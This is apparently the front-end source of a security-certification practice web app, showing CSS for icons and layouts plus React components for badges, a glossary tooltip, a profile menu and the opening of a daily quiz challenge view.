.nav-glyph-daily::after{width:10px;height:2px;background:currentColor;left:2px;top:5px;transform:translateX(-10px) rotate(-20deg);opacity:0;border-radius:2px;}
.nav-lnk:hover .nav-glyph-daily,.nav-glyph-daily.active{color:#ef4444;background:#ef444418;border-color:#ef444455;box-shadow:0 0 18px #ef444440;}
.nav-lnk:hover .nav-glyph-daily::after,.nav-glyph-daily.active::after{animation:arrowShot .6s ease both;}
.nav-glyph-pricing span{width:11px;height:11px;border-top:2px solid currentColor;border-right:2px solid currentColor;transform:rotate(-45deg);top:8px;}
.nav-glyph-pricing::before{width:2px;height:13px;background:currentColor;top:5px;}
.nav-glyph-pricing::after{width:9px;height:2px;background:currentColor;bottom:5px;border-radius:2px;opacity:.55;}
.nav-lnk:hover .nav-glyph-pricing,.nav-glyph-pricing.active{color:#22c55e;background:#22c55e18;border-color:#22c55e55;box-shadow:0 0 18px #22c55e40;}
.nav-lnk:hover .nav-glyph-pricing span,.nav-glyph-pricing.active span{animation:upgradeHead .55s cubic-bezier(.16,1,.3,1) both;}
.nav-lnk:hover .nav-glyph-pricing::before,.nav-glyph-pricing.active::before{animation:upgradeStem .55s cubic-bezier(.16,1,.3,1) both;}
.nav-lnk:hover .nav-glyph-pricing::after,.nav-glyph-pricing.active::after{animation:upgradeTrail .55s cubic-bezier(.16,1,.3,1) both;}
.nav-glyph-objectives span{width:13px;height:13px;border:2px solid currentColor;border-radius:3px;}
.nav-glyph-objectives::before{width:7px;height:2px;background:currentColor;top:8px;}
.nav-glyph-objectives::after{width:7px;height:2px;background:currentColor;top:13px;}
.nav-lnk:hover .nav-glyph-objectives,.nav-glyph-objectives.active{color:#8b5cf6;background:#8b5cf618;border-color:#8b5cf655;box-shadow:0 0 18px #8b5cf640;}
.nav-lnk:hover .nav-glyph-objectives span,.nav-glyph-objectives.active span{animation:objectiveCard .55s ease both;}
.nav-lnk:hover .nav-glyph-objectives::before,.nav-glyph-objectives.active::before{animation:objectiveTick .55s ease both;}
.nav-lnk:hover .nav-glyph-objectives::after,.nav-glyph-objectives.active::after{animation:objectiveTick .55s ease .08s both;}
.nav-glyph-exam span{width:15px;height:18px;border:2px solid currentColor;border-radius:3px;}
.nav-glyph-exam::before{width:9px;height:9px;border:2px solid currentColor;border-radius:50%;right:2px;bottom:1px;background:${t.panel};}
.nav-glyph-exam::after{width:5px;height:2px;background:currentColor;right:5px;bottom:6px;transform-origin:right center;transform:rotate(-45deg);}
.nav-lnk:hover .nav-glyph-exam,.nav-glyph-exam.active{color:#14b8a6;background:#14b8a618;border-color:#14b8a655;box-shadow:0 0 18px #14b8a640;}
.nav-lnk:hover .nav-glyph-exam::before,.nav-glyph-exam.active::before{animation:examScan .7s ease both;}
.nav-lnk:hover .nav-glyph-exam::after,.nav-glyph-exam.active::after{animation:examHandle .7s ease both;}
.nav-glyph-privacy span{width:13px;height:10px;border:2px solid currentColor;border-radius:2px;bottom:4px;}
.nav-glyph-privacy::before{width:10px;height:9px;border:2px solid currentColor;border-bottom:0;border-radius:9px 9px 0 0;top:3px;transform-origin:85% 100%;}
.nav-glyph-privacy.active{color:${t.green};background:${t.green}14;border-color:${t.green}50;box-shadow:0 0 16px ${t.green}30;}
.nav-glyph-privacy.active::before{animation:lockClose .55s ease both;}
.nav-glyph-terms span{width:12px;height:15px;border:2px solid currentColor;border-radius:2px;}
.nav-glyph-terms::before{width:5px;height:5px;border-left:2px solid currentColor;border-bottom:2px solid currentColor;right:4px;top:4px;transform:rotate(-45deg);}
.nav-glyph-terms::after{width:8px;height:2px;background:currentColor;bottom:6px;border-radius:2px;}
.nav-lnk:hover .nav-glyph-terms,.nav-glyph-terms.active{color:#ec4899;background:#ec489918;border-color:#ec489955;box-shadow:0 0 18px #ec489940;}
.nav-lnk:hover .nav-glyph-terms span,.nav-glyph-terms.active span{animation:termsPage .58s ease both;}
.nav-lnk:hover .nav-glyph-terms::after,.nav-glyph-terms.active::after{animation:termsSign .58s ease both;}
.nav-lnk:hover .nav-glyph,.nav-lnk.act .nav-glyph{transform:translateY(-1px);}
.page-title-row{display:flex;align-items:center;gap:12px;margin-bottom:6px;}
.page-title-row .nav-glyph{width:34px;height:34px;border-radius:10px;}
.page-title-row .nav-glyph-mcq span{width:15px;height:19px;}
.page-title-row .nav-glyph-pricing span{width:15px;height:15px;top:12px;}
.page-title-row .nav-glyph-pricing::before{height:18px;top:8px;}
.page-title-row .nav-glyph-objectives span{width:18px;height:18px;}
.page-title-row .nav-glyph-exam span{width:20px;height:23px;}
.page-title-row .nav-glyph-terms span{width:17px;height:21px;}
.chapter-icon,.sim-icon{width:34px;height:34px;border-radius:10px;display:inline-flex;align-items:center;justify-content:center;position:relative;flex-shrink:0;color:var(--icon-color);background:color-mix(in srgb,var(--icon-color) 12%, transparent);border:1px solid color-mix(in srgb,var(--icon-color) 34%, transparent);transition:transform .2s,box-shadow .2s,background .2s,border-color .2s;}
.chapter-icon span,.chapter-icon::before,.chapter-icon::after,.sim-icon span,.sim-icon::before,.sim-icon::after{content:"";position:absolute;display:block;transition:all .25s ease;}
.chapter-icon:hover,.sim-icon:hover,.chapter-card:hover .chapter-icon,.sim-card:hover .sim-icon,.card-hover:hover .sim-icon{transform:translateY(-2px) scale(1.03);box-shadow:0 12px 26px color-mix(in srgb,var(--icon-color) 28%, transparent);background:color-mix(in srgb,var(--icon-color) 18%, transparent);border-color:color-mix(in srgb,var(--icon-color) 52%, transparent);}
.chapter-icon-1 span{width:15px;height:18px;border:2px solid currentColor;border-radius:8px 8px 4px 4px;bottom:6px;}
.chapter-icon-1::before{width:12px;height:10px;border:2px solid currentColor;border-bottom:0;border-radius:10px 10px 0 0;top:5px;}
.chapter-icon-1::after{width:4px;height:4px;background:currentColor;border-radius:50%;}
.chapter-icon-2 span{width:17px;height:17px;border:2px solid currentColor;clip-path:polygon(50% 0,100% 90%,0 90%);}
.chapter-icon-2::before{width:3px;height:9px;background:currentColor;top:10px;border-radius:3px;}
.chapter-icon-2::after{width:3px;height:3px;background:currentColor;border-radius:50%;bottom:8px;}
.chapter-icon-3 span{width:18px;height:14px;border:2px solid currentColor;border-radius:3px;bottom:8px;}
.chapter-icon-3::before{width:22px;height:12px;border-left:2px solid currentColor;border-top:2px solid currentColor;transform:rotate(45deg);top:5px;}
.chapter-icon-4 span{width:18px;height:12px;border:2px solid currentColor;border-radius:3px;top:8px;}
.chapter-icon-4::before{width:2px;height:8px;background:currentColor;bottom:6px;}
.chapter-icon-4::after{width:12px;height:2px;background:currentColor;bottom:5px;border-radius:2px;}
.chapter-icon-5 span{width:16px;height:18px;border:2px solid currentColor;border-radius:3px;}
.chapter-icon-5::before{width:8px;height:2px;background:currentColor;top:10px;}
.chapter-icon-5::after{width:8px;height:2px;background:currentColor;top:16px;}
.sim-icon-terminal span{width:18px;height:14px;border:2px solid currentColor;border-radius:3px;}
.sim-icon-terminal::before{width:6px;height:2px;background:currentColor;left:9px;top:13px;box-shadow:6px 0 0 currentColor;}
.sim-icon-drag span{width:7px;height:7px;border:2px solid currentColor;border-radius:2px;left:7px;top:7px;box-shadow:13px 13px 0 -2px transparent,13px 13px 0 0 currentColor;}
.sim-icon-drag::before{width:13px;height:2px;background:currentColor;transform:rotate(45deg);}
.sim-icon-hotspot span{width:17px;height:17px;border:2px solid currentColor;border-radius:50%;}
.sim-icon-hotspot::before{width:7px;height:7px;background:currentColor;border-radius:50%;}
.sim-icon-ordering span{width:16px;height:2px;background:currentColor;top:10px;box-shadow:0 6px 0 currentColor,0 12px 0 currentColor;}
.sim-icon-ordering::before{width:4px;height:4px;background:currentColor;border-radius:50%;left:7px;top:9px;box-shadow:0 6px 0 currentColor,0 12px 0 currentColor;}
.sim-icon-fill span{width:18px;height:2px;background:currentColor;bottom:9px;}
.sim-icon-fill::before{width:15px;height:6px;border:2px solid currentColor;border-top:0;transform:rotate(-35deg);top:10px;}
.sim-icon-config span{width:16px;height:16px;border:2px solid currentColor;border-radius:50%;}
.sim-icon-config::before{width:4px;height:4px;background:currentColor;border-radius:50%;}
.sim-icon-log span{width:18px;height:14px;border-left:2px solid currentColor;border-bottom:2px solid currentColor;}
.sim-icon-log::before{width:3px;height:7px;background:currentColor;bottom:9px;left:11px;box-shadow:6px -4px 0 currentColor,12px -1px 0 currentColor;}
.sim-icon-scenario span{width:16px;height:18px;border:2px solid currentColor;border-radius:3px;}
.sim-icon-scenario::before{width:8px;height:2px;background:currentColor;top:11px;box-shadow:0 5px 0 currentColor;}
.profile-menu{position:relative;z-index:220;}
.profile-popover{position:absolute;left:0;top:calc(100% + 8px);z-index:999;width:min(340px,calc(100vw - 28px));padding:16px;background:${t.surface};border:1px solid ${t.border};border-radius:8px;box-shadow:0 20px 50px rgba(0,0,0,.24);}
.sidebar .profile-popover{left:14px;}
.mobile-profile .profile-popover{right:0;left:auto;}
.term-wrap{position:relative;display:inline-block;}
.term-link{border:0;background:transparent;color:${t.accent};font:inherit;font-weight:700;text-decoration:underline;text-decoration-style:dotted;text-underline-offset:3px;cursor:pointer;padding:0 1px;}
.term-pop{position:absolute;z-index:50;left:0;top:1.7em;width:min(280px,78vw);padding:10px 12px;border:1px solid;border-radius:8px;box-shadow:0 16px 34px rgba(0,0,0,.18);font-size:12px;line-height:1.55;}
.exam-layout{display:grid;grid-template-columns:minmax(0,1fr) 180px;gap:16px;}
.exam-map{padding:14px;height:fit-content;position:sticky;top:96px;}
.exam-map-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:6px;}
.prog-track{background:${t.border};border-radius:99px;overflow:hidden;}
.prog-fill{height:100%;border-radius:99px;transition:width .6s cubic-bezier(.16,1,.3,1);}
.opt{display:flex;align-items:flex-start;gap:12px;padding:14px 16px;border-radius:8px;border:1.5px solid ${t.border};cursor:pointer;transition:background .18s,border-color .18s,transform .18s; background:${t.surface};min-width:0;}
.opt:hover:not(.done){border-color:${t.accent};background:${t.accent}08;transform:translateY(-1px);}
.opt.sel{border-color:${t.accent};background:${t.accent}10;}
.opt.ok{border-color:${t.green}70!important;background:${t.green}08!important;}
.opt.bad{border-color:${t.red}60!important;background:${t.red}07!important;}
.opt.done{cursor:default;}
.opt-ltr{width:30px;height:30px;border-radius:8px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;border:1.5px solid ${t.border};color:${t.textDim};transition:all .18s;background:${t.panel};}
.opt:hover:not(.done) .opt-ltr,.opt.sel .opt-ltr{border-color:${t.accent};color:${t.accent};}
.opt.ok .opt-ltr{border-color:${t.green}70;color:${t.green};background:${t.green}10;}
.opt.bad .opt-ltr{border-color:${t.red}60;color:${t.red};background:${t.red}0d;}
.terminal{background:#0d1117;border:1px solid #30363d;border-radius:8px;font-family:'JetBrains Mono',monospace;font-size:13px;color:#c9d1d9;padding:16px;overflow-y:auto;max-height:280px;line-height:1.7;}
.log-block{font-family:'JetBrains Mono',monospace;font-size:12.5px;background:${t.inputBg};border:1px solid ${t.border};border-radius:8px;padding:16px;color:${t.textSec};line-height:1.9;white-space:pre-wrap;overflow-x:auto;}
.drag-item{padding:10px 14px;background:${t.surface};border:1.5px solid ${t.border};border-radius:7px;cursor:grab;user-select:none;transition:all .2s;font-size:13px;color:${t.text};}
.drag-item:hover{border-color:${t.accent};}
.drag-item.selected{border-color:${t.accent};background:${t.accent}12;box-shadow:0 0 0 3px ${t.accent}16;}
.drop-zone{min-height:44px;border:2px dashed ${t.border};border-radius:7px;padding:8px;transition:all .2s;display:flex;align-items:center;justify-content:center;}
.drop-zone.over{border-color:${t.accent};background:${t.accent}08;}
.order-item{padding:10px 14px;background:${t.surface};border:1.5px solid ${t.border};border-radius:7px;display:flex;align-items:center;gap:10px;font-size:13px;cursor:default;transition:border-color .2s;color:${t.text};}
.order-item:hover{border-color:${t.accent}44;}
@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@keyframes shimmer{from{opacity:.6}to{opacity:1}}
@keyframes bulbPulse{from{box-shadow:0 0 0 #f59e0b00;}to{box-shadow:0 0 18px #f59e0b99;}}
@keyframes lockClose{0%{transform:translateY(-5px) rotate(-18deg);}70%{transform:translateY(1px) rotate(3deg);}100%{transform:translateY(0) rotate(0);}}
@keyframes roofDrop{0%{top:-8px;opacity:0;}70%{top:5px;opacity:1;}100%{top:3px;opacity:1;}}
@keyframes arrowShot{0%{transform:translateX(-12px) rotate(-20deg);opacity:0;}65%{transform:translateX(7px) rotate(-20deg);opacity:1;}100%{transform:translateX(5px) rotate(-20deg);opacity:1;}}
@keyframes paperLift{0%{transform:translateY(0) rotate(0);}60%{transform:translateY(-3px) rotate(-5deg);}100%{transform:translateY(-1px) rotate(0);}}
@keyframes lineCheck{0%{width:0;opacity:.3;}100%{width:6px;opacity:1;}}
@keyframes upgradeHead{0%{transform:translateY(0) rotate(-45deg);}68%{transform:translateY(-6px) rotate(-45deg);}100%{transform:translateY(-3px) rotate(-45deg);}}
@keyframes upgradeStem{0%{transform:translateY(0);}68%{transform:translateY(-6px);}100%{transform:translateY(-3px);}}
@keyframes upgradeTrail{0%{opacity:0;transform:translateY(4px) scaleX(.45);}70%{opacity:1;transform:translateY(0) scaleX(1);}100%{opacity:.65;transform:translateY(1px) scaleX(.7);}}
@keyframes objectiveCard{0%{transform:rotate(0) scale(1);}55%{transform:rotate(-5deg) scale(1.06);}100%{transform:rotate(0) scale(1);}}
@keyframes objectiveTick{0%{transform:translateX(-5px);opacity:0;width:0;}100%{transform:translateX(0);opacity:1;width:7px;}}
@keyframes examScan{0%{right:8px;bottom:7px;transform:scale(.85);}55%{right:0;bottom:0;transform:scale(1.05);}100%{right:2px;bottom:1px;transform:scale(1);}}
@keyframes examHandle{0%{transform:rotate(-20deg);opacity:.3;}55%{transform:rotate(-60deg);opacity:1;}100%{transform:rotate(-45deg);opacity:1;}}
@keyframes termsPage{0%{transform:rotateY(0);}55%{transform:rotateY(-28deg) translateX(-1px);}100%{transform:rotateY(0);}}
@keyframes termsSign{0%{width:0;opacity:.2;}100%{width:8px;opacity:1;}}
.fu{animation:fadeUp .35s cubic-bezier(.16,1,.3,1) both;}
.chip{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:6px;font-size:12px;font-weight:700;border:1px solid;line-height:1.4;}
.app-shell{display:flex;min-height:100vh;background:transparent;}
.sidebar{width:226px;min-height:100vh;background:linear-gradient(180deg, ${t.panel}, ${t.panel}f2);border-right:1px solid ${t.border};display:flex;flex-direction:column;flex-shrink:0;position:sticky;top:0;height:100vh;z-index:120;overflow:visible;box-shadow:12px 0 34px rgba(7,12,24,.08);}
.app-main{flex:1;overflow-y:auto;min-width:0;}
.mobile-topbar{display:none;}
.auth-layout{width:100%;max-width:980px;display:grid;grid-template-columns:minmax(0,1.05fr) minmax(360px,.95fr);gap:24px;align-items:stretch;}
.landing-page{min-height:100vh;padding:22px 24px 40px;background:transparent;}
.landing-header{max-width:1120px;margin:0 auto 28px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
.landing-main{max-width:1120px;margin:0 auto;display:flex;flex-direction:column;gap:22px;}
.landing-hero{display:grid;grid-template-columns:minmax(0,1.05fr) minmax(320px,.95fr);gap:22px;align-items:center;padding:34px 0 10px;}
.landing-title{font-size:52px;line-height:1.02;font-weight:900;letter-spacing:0;color:${t.text};max-width:720px;}
.landing-copy{color:${t.textSec};font-size:17px;line-height:1.75;max-width:620px;margin-top:16px;}
.landing-preview{display:flex;flex-direction:column;gap:14px;}
.landing-stat-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;}
.landing-feature-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px;}
.landing-auth-section{display:grid;grid-template-columns:minmax(0,1fr) minmax(340px,430px);gap:22px;align-items:start;padding:10px 0 20px;}
.referral-grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px;}
.pricing-pro-card,.pricing-free-card{min-width:0;}
.onboarding-overlay{position:fixed;inset:0;z-index:80;background:rgba(4,8,18,.72);backdrop-filter:blur(10px);display:grid;place-items:center;padding:20px;animation:fadeUp .22s ease both;}
.onboarding-modal{width:min(100%,520px);padding:28px 30px;position:relative;box-shadow:0 30px 90px rgba(0,0,0,.36);}
@media (max-width: 860px){
  html,body,#root{max-width:100%;overflow-x:hidden;}
  body{font-size:14px;}
  .app-shell{display:block;padding-bottom:72px;}
  .sidebar{position:fixed;left:0;right:0;bottom:0;top:auto;width:100%;height:64px;min-height:64px;border-right:0;border-top:1px solid ${t.border};z-index:20;}
  .sidebar > div{display:none!important;}
  .sidebar nav{flex-direction:row!important;overflow-x:auto;padding:8px!important;gap:6px!important;}
  .nav-lnk{min-width:58px;flex-direction:column;gap:2px;padding:7px 9px;font-size:10px;text-align:center;}
  .nav-lnk span:first-child{font-size:15px!important;}
  .mobile-topbar{display:flex;position:sticky;top:0;z-index:130;align-items:center;justify-content:space-between;gap:12px;padding:12px 16px;background:${t.panel}f2;backdrop-filter:blur(14px);border-bottom:1px solid ${t.border};}
  main > div{padding-left:16px!important;padding-right:16px!important;max-width:100%!important;}
  [style*="grid-template-columns:1fr 1fr"],[style*="gridTemplateColumns:1fr 1fr"]{grid-template-columns:1fr!important;}
  [style*="grid-template-columns:repeat(4,1fr)"],[style*="gridTemplateColumns:repeat(4,1fr)"]{grid-template-columns:repeat(2,1fr)!important;}
  [style*="grid-template-columns:1fr 1fr 1fr"],[style*="gridTemplateColumns:1fr 1fr 1fr"]{grid-template-columns:1fr!important;}
  .pricing-grid{grid-template-columns:1fr!important;}
  .pricing-pro-card{order:-1;}
  .card{box-shadow:0 10px 26px rgba(7,12,24,.08);}
  .btn{width:auto;white-space:normal;}
  .auth-layout{grid-template-columns:minmax(0,1fr)!important;width:min(100%,calc(100vw - 48px))!important;max-width:calc(100vw - 48px)!important;min-width:0!important;gap:16px!important;overflow:hidden!important;}
  .auth-layout > section{min-width:0!important;width:100%!important;max-width:100%!important;overflow:hidden!important;}
  .auth-layout > section:first-child h1{font-size:28px!important;line-height:1.14!important;overflow-wrap:break-word!important;}
  .auth-layout > section:first-child{padding:24px!important;}
  .auth-layout > section:first-child p{font-size:14px!important;}
  .auth-stats{grid-template-columns:repeat(3,minmax(0,1fr))!important;gap:8px!important;margin-top:24px!important;}
  .auth-stat-card{padding:12px 10px!important;}
  .auth-stat-card div:first-child{font-size:22px!important;}
  .auth-stat-card .label{font-size:10px!important;letter-spacing:0!important;}
  .tab{padding:9px 10px!important;font-size:12px!important;}
  .landing-page{padding:16px 16px 88px!important;}
  .landing-header{align-items:flex-start;margin-bottom:18px!important;}
  .landing-header > div:last-child{width:100%;justify-content:flex-start!important;}
  .landing-hero{grid-template-columns:1fr!important;padding-top:10px!important;gap:16px!important;}
  .landing-title{font-size:34px!important;line-height:1.08!important;}
  .landing-copy{font-size:14px!important;}
  .landing-stat-grid{grid-template-columns:repeat(3,minmax(0,1fr))!important;}
  .landing-feature-grid,.landing-auth-section,.referral-grid{grid-template-columns:1fr!important;}
  .landing-auth-section{gap:14px!important;}
  .exam-layout{grid-template-columns:1fr!important;}
  .exam-map{order:-1;position:relative!important;top:auto!important;width:100%;padding:12px!important;}
  .exam-map-grid{grid-template-columns:repeat(10,minmax(30px,1fr))!important;}
  .onboarding-overlay{align-items:end;padding:12px;}
  .onboarding-modal{padding:24px 22px;max-height:92vh;overflow-y:auto;}
}
`;

// ═══════════════════════════════════════════════════════════════
// MICRO COMPONENTS
// ═══════════════════════════════════════════════════════════════
function ProgBar({v,c,h=8}) {
  return <div className="prog-track" style={{height:h}}><div className="prog-fill" style={{width:`${Math.min(v,100)}%`,background:c,height:h}}/></div>;
}
function BrandMark({size=30}) {
  return (
    <img
      src="/secureplus-logo.svg"
      alt="SecurePlus"
      width={size}
      height={size}
      style={{borderRadius:Math.max(6,Math.round(size*.22)),display:"block",flexShrink:0}}
    />
  );
}
function SimBadge({type,t}) {
  const s=Object.values(SIM_TYPES).find(x=>x.id===type)||SIM_TYPES.TERMINAL;
  return <span className="chip" style={{background:`${s.color}15`,color:s.color,borderColor:`${s.color}30`}}><SimIcon type={type} size={18}/> {s.label}</span>;
}
function DiffBadge({d,t}) {
  const map={easy:{c:"#10b981",label:"Easy"},medium:{c:"#f59e0b",label:"Medium"},hard:{c:"#ef4444",label:"Hard"}};
  const {c,label}=map[d]||map.easy;
  return <span className="chip" style={{background:`${c}15`,color:c,borderColor:`${c}30`}}>{label}</span>;
}
function GlossaryText({text,t,style}) {
  const [openTerm,setOpenTerm]=useState(null);
  const value=String(text||"");
  const terms=Object.keys(GLOSSARY_TERMS).sort((a,b)=>b.length-a.length);
  const pattern=new RegExp(`\\b(${terms.map(term=>term.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")).join("|")})\\b`,"gi");
  const parts=value.split(pattern).filter(part=>part!=="");
  const normalize=part=>terms.find(term=>term.toLowerCase()===part.toLowerCase());

  return(
    <span style={style}>
      {parts.map((part,index)=>{
        const term=normalize(part);
        if(!term) return <span key={`${part}-${index}`}>{part}</span>;
        const key=`${term}-${index}`;
        return(
          <span key={key} className="term-wrap">
            <button type="button" className="term-link" onClick={e=>{e.stopPropagation();setOpenTerm(openTerm===key?null:key);}}>
              {part}
            </button>
            {openTerm===key&&(
              <span className="term-pop" style={{background:t.surface,borderColor:t.border,color:t.text}}>
                <strong style={{color:t.accent}}>{term}</strong>
                <span style={{display:"block",marginTop:4,color:t.textSec}}>{GLOSSARY_TERMS[term]}</span>
              </span>
            )}
          </span>
        );
      })}
    </span>
  );
}
function ChBadge({chId,t}) {
  const ch=CHAPTERS.find(c=>c.id===chId);
  if(!ch) return null;
  const color=chapterColor(ch.id);
  return <span className="chip" style={{background:`${color}14`,color,borderColor:`${color}30`,fontSize:11}}><ChapterIcon id={ch.id} size={18}/> Ch.{ch.id}</span>;
}
function NavGlyph({type,active}) {
  return <span className={`nav-glyph nav-glyph-${type} ${active?"active":""}`} aria-hidden="true"><span/></span>;
}
function chapterColor(id) {
  return ({1:"#2f7df6",2:"#ef4444",3:"#14b8a6",4:"#a78bfa",5:"#f59e0b"})[id] || "#2f7df6";
}
function ChapterIcon({id,size=34}) {
  return <span className={`chapter-icon chapter-icon-${id}`} style={{"--icon-color":chapterColor(id),width:size,height:size,borderRadius:Math.max(6,Math.round(size*.28))}} aria-hidden="true"><span/></span>;
}
function simIconClass(type) {
  return ({
    "TERMINAL SIM":"terminal",
    "DRAG & DROP":"drag",
    HOTSPOT:"hotspot",
    ORDERING:"ordering",
    "FILL BLANK":"fill",
    "CONFIG/ACL":"config",
    "LOG ANALYSIS":"log",
    SCENARIO:"scenario",
  })[type] || "scenario";
}
function SimIcon({type,size=34}) {
  const s=Object.values(SIM_TYPES).find(x=>x.id===type)||SIM_TYPES.TERMINAL;
  return <span className={`sim-icon sim-icon-${simIconClass(type)}`} style={{"--icon-color":s.color,width:size,height:size,borderRadius:Math.max(6,Math.round(size*.28))}} aria-hidden="true"><span/></span>;
}
function Alert({msg,type="error",t}) {
  if(!msg) return null;
  const c=type==="success"?t.green:type==="warn"?t.amber:t.red;
  return <div style={{padding:"10px 14px",borderRadius:8,background:`${c}12`,border:`1px solid ${c}30`,color:c,fontSize:13,marginBottom:12}}>{msg}</div>;
}
function loginMethodLabel(user) {
  const method=(user?.loginMethod || user?.authProvider || "local").toLowerCase();
  if(method.includes("google")) return "Google SSO";
  if(method.includes("email")) return "Email and password";
  if(method.includes("supabase")) return "Supabase email login";
  return "Local demo account";
}
function ProfileMenu({user,t,onUpdateProfile,onChangePassword,onLogout,compact=false}) {
  const [open,setOpen]=useState(false);
  const [name,setName]=useState(user?.name||"");
  const [password,setPassword]=useState("");
  const [confirm,setConfirm]=useState("");
  const [msg,setMsg]=useState("");
  const [err,setErr]=useState("");
  const [saving,setSaving]=useState(false);
  const isGoogle=(user?.loginMethod||"").toLowerCase().includes("google");

  useEffect(()=>setName(user?.name||""),[user?.name]);

  const saveName=async()=>{
    setErr("");setMsg("");
    const clean=name.trim();
    if(!clean){setErr("Name cannot be empty.");return;}
    setSaving(true);
    try{
      await onUpdateProfile(clean);
      setMsg("Username updated.");
    }catch(e){
      setErr(e.message||"Unable to update username.");
    }finally{setSaving(false);}
  };
  const savePassword=async()=>{
    setErr("");setMsg("");
    if(isGoogle){setErr("This account uses Google SSO. Change your password in your Google account.");return;}
    if(password!==confirm){setErr("Passwords do not match.");return;}
    const issue=getPasswordIssue(password);
    if(issue){setErr(issue);return;}
    setSaving(true);
    try{
      await onChangePassword(password);
      setPassword("");setConfirm("");setMsg("Password updated.");
    }catch(e){
      setErr(e.message||"Unable to update password.");
    }finally{setSaving(false);}
  };

  return(
    <div className={`profile-menu ${compact?"mobile-profile":""}`}>
      <button className="btn btn-ghost" style={{width:compact?36:"100%",minHeight:compact?36:44,padding:compact?0:"7px 8px",justifyContent:compact?"center":"flex-start"}} onClick={()=>setOpen(o=>!o)} aria-label="Open profile settings">
        <span style={{width:30,height:30,borderRadius:"50%",background:`${t.accent}20`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:13,fontWeight:800,color:t.accent,flexShrink:0}}>
          {user.name[0]?.toUpperCase()}
        </span>
        {!compact&&(
          <span style={{minWidth:0,textAlign:"left"}}>
            <span style={{display:"block",fontSize:13,fontWeight:700,color:t.text,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{user.name}</span>
            <span style={{display:"block",fontSize:10,fontWeight:700,color:user.tier==="pro"?t.accent:t.textDim,textTransform:"uppercase"}}>{user.tier}</span>
          </span>
        )}
      </button>
      {open&&(
        <div className="profile-popover">
          <div style={{display:"flex",justifyContent:"space-between",gap:10,alignItems:"flex-start",marginBottom:12}}>
            <div>
              <div style={{fontWeight:800,color:t.text,fontSize:15}}>Profile</div>
              <div style={{fontSize:12,color:t.textDim}}>{loginMethodLabel(user)}</div>
            </div>
            <button className="btn btn-ghost" style={{fontSize:12,minHeight:30,padding:"4px 9px"}} onPointerUp={e=>{e.preventDefault();e.stopPropagation();setOpen(false);}} onClick={e=>{e.preventDefault();e.stopPropagation();setOpen(false);}}>Close</button>
          </div>
          <div style={{fontSize:12,color:t.textSec,lineHeight:1.6,marginBottom:12}}>
            Signed in as <strong style={{color:t.text}}>{user.email}</strong>
          </div>
          <Alert msg={err} type="error" t={t}/>
          <Alert msg={msg} type="success" t={t}/>
          <div style={{display:"grid",gap:12}}>
            <div>
              <label className="label" style={{display:"block",marginBottom:6}}>Username</label>
              <div style={{display:"flex",gap:8}}>
                <input className="input" value={name} onChange={e=>setName(e.target.value)} placeholder="Your display name"/>
                <button className="btn btn-outline" style={{fontSize:12,flexShrink:0}} onClick={saveName} disabled={saving}>Save</button>
              </div>
            </div>
            <div style={{borderTop:`1px solid ${t.border}`,paddingTop:12}}>
              <label className="label" style={{display:"block",marginBottom:6}}>Change password</label>
              <div style={{display:"grid",gap:8}}>
                <input className="input" type="password" value={password} onChange={e=>setPassword(e.target.value)} placeholder={isGoogle?"Managed by Google":"New password"}/>
                <input className="input" type="password" value={confirm} onChange={e=>setConfirm(e.target.value)} placeholder="Confirm new password"/>
                <button className="btn btn-primary" style={{fontSize:12}} onClick={savePassword} disabled={saving||isGoogle}>{isGoogle?"Use Google account settings":"Update Password"}</button>
              </div>
            </div>
            <button className="btn btn-ghost" style={{fontSize:12,justifyContent:"center",color:t.textDim}} onClick={onLogout}>Sign Out</button>
          </div>
        </div>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// DAILY CHALLENGE VIEW (no login required)
// ═══════════════════════════════════════════════════════════════
function DailyChallenge({t,onLogin,user=null}) {
  const challenge = getTodayChallenge();
  const [step, setStep] = useState("intro"); // intro | quiz | done
  const [qIndex, setQIndex] = useState(0);
  const [selected, setSelected] = useState(null);
  const [submitted, setSubmitted] = useState(false);
  const [results, setResults] = useState([]);
  const [showWrong, setShowWrong] = useState(false);

  const questions = challenge.type==="mcq5"
    ? MCQ_BANK.filter(q=>challenge.qids.includes(q.id))
    : [];
  const pbq = challenge.type==="pbq"
    ? PBQ_BANK.find(p=>p.id===challenge.qid)
    : null;

  const current = questions[qIndex];
  const totalQuestions = challenge.type==="pbq" ? 1 : questions.length;

  const submitQ = () => {
    if(selected===null) return;
    const correct = selected === current.correct;
    capture("daily_question_answered", { question_id: current.id, correct, signed_in: Boolean(user) });
    setResults(r=>[...r,{qid:current.id,correct,selected}]);
    setSubmitted(true);
  };
  const nextQ = () => {
    if(qIndex<questions.length-1){ setQIndex(i=>i+1); setSelected(null); setSubmitted(false); setShowWrong(false); }
    else setStep("done");
  };

  const correctCount = results.filter(r=>r.correct).length;
  const canSeeFeedback = user?.tier === "pro";

  if(step==="intro") return (
    <div style={{padding:"32px 24px",maxWidth:600,margin:"0 auto",textAlign:"center"}} className="fu">
      <div style={{fontSize:48,marginBottom:16}}>🎯</div>
      <h2 style={{fontSize:26,fontWeight:700,marginBottom:8,color:t.text}}>Daily Challenge</h2>
      <p style={{color:t.textSec,marginBottom:6}}>
        {user ? "Practice today's focused challenge from your account." : "No account needed. One free challenge every day."}
      </p>
      <div className="card" style={{padding:"20px 24px",margin:"24px 0",textAlign:"left"}}>
        <div style={{fontSize:20,marginBottom:8}}>{challenge.type==="pbq"?"💡":"📝"}</div>
        <div style={{fontWeight:600,fontSize:16,marginBottom:6,color:t.text}}>{challenge.title}</div>
        <div style={{color:t.textSec,fontSize:14}}>{challenge.description}</div>
        <div style={{marginTop:12,color:t.textDim,fontSize:13}}>{challenge.type==="mcq5"?"5 multiple-choice questions":"1 performance-based question"}</div>
      </div>
